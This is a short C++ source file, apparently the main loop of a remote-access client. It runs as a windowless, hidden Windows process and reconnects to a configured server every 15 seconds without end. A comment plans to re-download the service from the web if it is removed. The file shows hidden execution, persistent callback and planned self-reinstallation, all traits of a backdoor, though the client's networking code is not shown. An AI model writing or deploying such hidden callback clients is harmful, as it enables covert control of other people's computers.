#include "general.h"

//WinMain is the entry point for windows subsystem (GUI apps) but without initializing the window the process will be hidden graphically
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

	Client MyClient(Settings::serverIP, Settings::serverPort); //Client

	while (true)
	{
		//Here should check if service is still running/exists, if it doesn't then create it again by downloading it from the web I guess

		if (!MyClient.connected)
		{
			while (!MyClient.Connect())
			{
				Sleep(15000);
			}
		}
		Sleep(15000);
	}
	
    return 0;
}